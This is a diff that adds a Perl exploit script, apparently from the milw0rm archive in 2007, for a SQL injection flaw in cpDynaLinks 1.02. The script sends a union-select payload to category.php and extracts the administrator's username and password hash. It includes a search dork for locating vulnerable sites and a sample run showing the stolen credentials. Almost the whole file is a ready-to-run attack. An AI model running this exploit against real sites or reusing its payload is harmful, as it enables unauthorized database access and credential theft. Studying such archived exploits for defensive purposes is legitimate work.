@@ -1,0 +1,41 @@
+#!/usr/bin/perl
+
+# cpDynaLinks 1.02 Remote Sql Inyection exploit
+# download:
+# http://www.cplinks.com/download/cpdynalinks/cpdynalinks_version_1_02_full.zip
+# bug found by s0cratex
+# exploit written by ka0x
+# D.O.M TEAM 2007
+# d0rk: Powered by cpDynaLinks
+# need magic_quotes_gpc off
+
+# contact: <ka0x01[at]gmail.com> <s0cratex[at]nasa.gov>
+
+# ka0x@domlabs:~# perl cpdynalinks.pl http://127.0.0.1/
+#
+# [+] connecting in http://127.0.0.1/...
+# [!] user: admin  [!] pass: c9cb9115e90580e14a0407ed1fcf8039
+
+use strict;
+use LWP::UserAgent;
+
+my $host = $ARGV[0];
+
+ if(!$ARGV[0]) {
+    print "\n[x] cpDynaLinks 1.02 Remote Sql Inyection exploit\n";
+    print "[x] written by ka0x - ka0x01[at]gmail.com\n";
+    print "[x] usage: perl $0 [host]\n";
+    print "[x] example: http://host.com/cpDynaLinks\n";
+    exit(1);
+ }
+ 
+    print "\n[+] connecting in $host...\n";
+    my $cnx = LWP::UserAgent->new() or die;
+    my $go=$cnx->get($host."/category.php?category=-1'/**/union/**/select/**/1,2,3,concat(0x5f5f5f5f,0x5b215d20757365723a20,admin_username,0x20205b215d20706173733a20,admin_password,0x5f5f5f5f),5,6,7,8,9,9,9,9/**/from/**/mnl_admin/*");
+    if ($go->content =~ m/____(.*?)____/ms) {
+        print "$1\n";
+    } else {
+        print "\n[-] exploit failed\n";
+    }
+
+# milw0rm.com [2007-10-10]
